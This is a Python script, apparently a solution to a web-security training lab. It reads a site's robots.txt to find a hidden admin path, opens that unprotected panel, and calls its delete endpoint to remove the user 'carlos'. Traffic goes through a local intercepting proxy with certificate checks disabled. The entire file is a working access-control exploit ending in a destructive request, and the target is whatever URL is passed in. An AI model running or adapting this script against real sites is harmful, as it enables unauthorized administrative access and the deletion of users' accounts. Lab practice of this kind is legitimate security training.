import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def checkAdmin(url):
    response = requests.get(url, proxies=proxies, verify=False)
    if response.status_code == 200:
        print("Finding robots.txt...")
        robotURL = url + "/robots.txt"
        res = requests.get(robotURL, proxies=proxies, verify=False).text
        match = re.search(r"Disallow:\s+(/.*)", res)
        #path = re.compile("Disallow: ", res)
        path = match.group(1)
        print("Admin path: ", path)
        adminURL = url + path
        print("Admin url found: ", adminURL)
        response = requests.get(adminURL, proxies=proxies, verify=False)
        if response.status_code == 200:
            deleteUserURL = adminURL + "/delete?username=carlos"
            r = requests.get(deleteUserURL, proxies=proxies, verify=False)
            if r.status_code == 200:
                print("(+) User deleted successfully..!")
                sys.exit(-1)
            else:
                print("(-) Unable to delete user.")
                sys.exit(-1)
        else:
            print("(-) Unable to access admin panel.")
            sys.exit(-1)
    else:
        print("(-) Unable to reach the website.")
        sys.exit(-1)

def main():
    if(len(sys.argv) != 2):
        print("(*) Usage: ")
        print("python file.py <url> \nEg: python file.py www.example.com")
        sys.exit(-1)
    url = sys.argv[1]
    checkAdmin(url)



if __name__ == '__main__':
    main()